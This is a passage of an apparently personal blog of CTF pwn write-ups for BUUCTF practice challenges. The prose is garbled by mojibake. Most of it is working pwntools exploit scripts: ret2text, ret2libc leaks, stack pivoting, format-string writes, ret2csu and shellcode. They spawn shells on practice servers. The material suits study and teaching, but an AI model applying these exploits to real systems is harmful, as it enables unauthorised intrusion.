<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HERE!!!&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc =LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;Pull up your sword and tell me u story!\n&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x17-bjdctf-2020-babystack2"><a href="#0x17-bjdctf-2020-babystack2" class="headerlink" title="0x17.bjdctf_2020_babystack2"></a>0x17.bjdctf_2020_babystack2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6wiy4wdpntz4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1vwvliblv5gg.webp"></p><p>åé—¨å‡½æ•°å°±åœ¨çœ¼å‰ï¼Œä½†æ˜¯è¿™å§‹ç»ˆæ»¡è¶³ä¸äº†æº¢å‡ºçš„æ¡ä»¶ï¼Ÿ</p><p>çœ‹ä¼¼ä¸å¯æº¢å‡ºï¼Œå®é™…ä¸Šæš—è—ç„æœºï¼<code>è´Ÿæ•°ç»•è¿‡</code></p><p>ç»•è¿‡åå°±æ˜¯ä¸€é“å¾ˆç®€å•çš„ <code>ret2text</code> äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/23&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25305</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;[+]Please input the length of your name:\n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;-100&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> +p64(<span class="number">0x040072A</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.gh9foxpem14.webp"></p><h2 id="0x18-jarvisoj-fm"><a href="#0x18-jarvisoj-fm" class="headerlink" title="0x18.jarvisoj_fm"></a>0x18.jarvisoj_fm</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.571dn44kt5hc.webp"></p><p>â€‹    åå­—ä¸€çœ‹å°±æ˜¯<code>fms</code> é‚£å°±å…ˆæåœ¨è¿™é‡Œç­‰å­¦å®Œåå†æ¥åˆ·ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27329</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">payload = p32(<span class="number">0x0804A02C</span>) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230304/%E5%9B%BE%E7%89%87.18rob8rn38f4.webp"></p><h2 id="0x19-ciscn-2019-es-2"><a href="#0x19-ciscn-2019-es-2" class="headerlink" title="0x19.ciscn_2019_es_2"></a>0x19.ciscn_2019_es_2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4kdb4tr32kxs.webp"></p><p>â€‹    è¯»ä¸¤æ¬¡ï¼Œlet me think thinkã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4h1veooijfuo.webp"></p><p>â€‹    å‘ç°åé—¨ï¼Œä½†æ˜¯è¿™ä¸ªåé—¨æ²¡å•¥ç”¨é™¤äº†è°ƒç”¨äº†<code>system</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4niu6emnfbpc.webp"></p><p>â€‹    è¿™é‡Œæœ‰ä¸ªç–‘ç‚¹ : ä¸ºä»€ä¹ˆ<code>memset</code>åªåˆå§‹åŒ–<code>32å­—èŠ‚</code>?</p><p>â€‹    ä¸ºä»€ä¹ˆæœ€åè¿˜æŠŠç¬¬ä¸€æ¬¡è¾“å…¥çš„ä¸“é—¨æ‰“å°å‡ºæ¥äº†ï¼Ÿ</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.74tornys3se8.webp"></p><p>â€‹    åŸå› åªæœ‰ä¸€ä¸ªï¼š</p><p>â€‹    æ­¤æ—¶çš„sçš„å€¼ä¸º<code>123\naaaaaaaaaaaaaaaaaaaaaaaaaa</code></p><p>â€‹    å½“è¾“å…¥è¶…è¿‡<code>30bytes</code>å°±ä¼šä¹±ç </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7dm5g44u8ups.webp"></p><p>â€‹    æ£é¼“åŠå¤©ï¼Œå‘ç°åˆ©ç”¨æˆ‘ç°å­˜çŸ¥è¯†æ ¹æœ¬è§£ä¸å‡ºæ¥ï¼Œç½‘ä¸Šæœäº†ä¸€ä¸‹<code>es</code>ï¼Œå‘ç°çŸ¥è¯†ç‚¹æ˜¯<mark>æ ˆåŠ«æŒ/æ ˆè¿ç§»</mark>ã€‚</p><p>â€‹    <a class="link" href="https://www.yuque.com/hxfqg9/bin/erh0l7#TELMU">1.æ ˆè¿ç§»åŸç†<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230203/%E5%9B%BE%E7%89%87.4lfm0vr5xim8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.60ya2l6d8bgg.webp"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28297</span>)</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/25&quot;)</span></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/25&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_addr = celf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span>   </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">payload = p32(sys_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf_addr+ <span class="number">12</span>) + <span class="string">b&quot;sh&quot;</span> </span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;\0&#x27;</span> + p32(buf_addr-<span class="number">4</span>) + p32(leave_ret) </span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>æµç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img lazyload alt="image" data-src="D:\0_Hexoä¸ªäººåšå®¢\ç¬¬0ç‰ˆ\source_posts\Pwn.png"></p><h2 id="0x1a-jarvisoj-tell-me-something"><a href="#0x1a-jarvisoj-tell-me-something" class="headerlink" title="0x1a.jarvisoj_tell_me_something"></a>0x1a.jarvisoj_tell_me_something</h2><p><code>easy ret2text</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27259</span>)</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/26&quot;)</span></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/26&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400620</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input your message:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1b-pwn2-sctf-2016"><a href="#0x1b-pwn2-sctf-2016" class="headerlink" title="0x1b.pwn2_sctf_2016"></a>0x1b.pwn2_sctf_2016</h2><p><code>ret2libc3</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.2btn5432uubk.webp"></p><p>å½“æŸä¸ªå‡½æ•°æ³„éœ²ä½¿ç”¨<code>LibcSearcher</code>åŒ¹é…ä¸äº†æ—¶å€™ï¼Œå¯ä»¥å¤šå°è¯•å…¶ä»–å‡½æ•°è¿›è¡Œæ³„éœ²ã€‚</p><h2 id="0x1c-HarekazeCTF2019-baby-rop2"><a href="#0x1c-HarekazeCTF2019-baby-rop2" class="headerlink" title="0x1c.[HarekazeCTF2019]baby_rop2"></a>0x1c.[HarekazeCTF2019]baby_rop2</h2><p><code>ret2libc3</code></p><p><mark>è°ƒç”¨<code>printf</code>å‡½æ•°æ³„éœ²libcåœ°å€</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.4l8tfu4x7q0w.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c= remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29653</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/28&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0400731</span> <span class="comment"># rsi</span></span><br><span class="line">format_str = <span class="number">0x0400770</span>  <span class="comment"># %s</span></span><br><span class="line">ret_addr = <span class="number">0x00400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0xdeedbeef</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;name? &quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = u64(c.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1d-jarvisoj-level3"><a href="#0x1d-jarvisoj-level3" class="headerlink" title="0x1d.jarvisoj_level3"></a>0x1d.jarvisoj_level3</h2><p><code>ret2libc3</code></p><p><mark>è°ƒç”¨<code>write</code>å‡½æ•°æ³„éœ²libcåœ°å€</mark></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/29&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26123</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/29&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">__libc_start_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(__libc_start_main_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">__libc_start_main_addr=u32(c.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main_addr)</span><br><span class="line">libc_base=__libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1e-ciscn-2019-s-3"><a href="#0x1e-ciscn-2019-s-3" class="headerlink" title="0x1e.ciscn_2019_s_3"></a>0x1e.ciscn_2019_s_3</h2><p><mark>ret2csu</mark></p><p>â€‹    å‡½æ•°è¡¨é‡Œæ²¡æœ‰readå’Œwriteçš„pltå’Œgotï¼Œæ— æ³•è¿›è¡Œæ³„éœ²</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.o1m3686zj40.webp"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25488</span>)</span><br><span class="line"><span class="comment"># c = process((&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/30&quot;))</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/30&quot;</span>)</span><br><span class="line"></span><br><span class="line">vuln=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"><span class="comment"># vuln = 0x4004ED</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span>  <span class="comment">#rax=59</span></span><br><span class="line">mov_rdx_r13=<span class="number">0x400580</span> <span class="comment"># loc_400580</span></span><br><span class="line">rbp_r12_r13_r14_r15_ret=<span class="number">0x40059b</span> <span class="comment">#libc_csu</span></span><br><span class="line">sys_call=<span class="number">0x400517</span></span><br><span class="line">rdi_ret=<span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(vuln)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">stack_add=u64(c.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_add))</span><br><span class="line"></span><br><span class="line">bin_sh=stack_add-<span class="number">0x118</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi_ret)+p64(rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x1</span>)+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0</span>)+p64(bin_sh)<span class="comment">#r12=bin_sh+0x50 also success</span></span><br><span class="line">payload+=p64(mov_rdx_r13)+p64(mov_rax)+p64(rdi_ret)+p64(bin_sh)+p64(sys_call)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>æ­¤expå‚è€ƒï¼š<a class="link" href="https://blog.csdn.net/Lcw_linyx/article/details/124656798?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167558467816800211519179%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167558467816800211519179&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124656798-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ciscn_2019_s_3&spm=1018.2226.3001.4187">æ­¤å¤„è·³è½¬<i class="fas fa-external-link-alt"></i></a></p><p><mark>æ­¤é¢˜ç–‘æƒ‘ç‚¹</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1v6l5tyx4w4g.webp"></p><ol><li>æˆ‘æœ¬åœ°è°ƒè¯•ä¸€ç›´åç§»éƒ½æ˜¯<code>0x128</code></li><li>payloadç¬¬ä¸€æ®µçš„ä¼ å‚ä¸ºä»€ä¹ˆæ˜¯<code>/bin/sh\x00</code>åœ¨æœ€å‰é¢ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆæ˜¯<code>bin_sh+0x50</code>/<code>bin_sh+0x08</code>ï¼Ÿ</li><li>gdbè°ƒè¯•æŠ€å·§</li><li>æ±‡ç¼–</li><li>æˆ‘å¤ªèœäº†:cry:</li></ol><h2 id="0x1f-babyheap-0ctf-2017"><a href="#0x1f-babyheap-0ctf-2017" class="headerlink" title="0x1f.babyheap_0ctf_2017"></a>0x1f.babyheap_0ctf_2017</h2><h2 id="0x20-ez-pz-hackover-2016"><a href="#0x20-ez-pz-hackover-2016" class="headerlink" title="0x20.ez_pz_hackover_2016"></a>0x20.ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29519</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;name_addr = &quot;</span> + <span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;crashme\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">26</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(name_addr - <span class="number">28</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://blog.csdn.net/qq_44768749/article/details/108176719?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167559253416782429769316%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167559253416782429769316&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108176719-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ez_pz_hackover_2016&spm=1018.2226.3001.4187">ç‚¹æ­¤å¤„è·³è½¬<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x21-picoctf-2018-rop-chain"><a href="#0x21-picoctf-2018-rop-chain" class="headerlink" title="0x21.picoctf_2018_rop chain"></a>0x21.picoctf_2018_rop chain</h2><p>â€‹    è¾ƒä¸ºæœ‰è¶£çš„å¤ä¹ ç»ƒæ‰‹é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 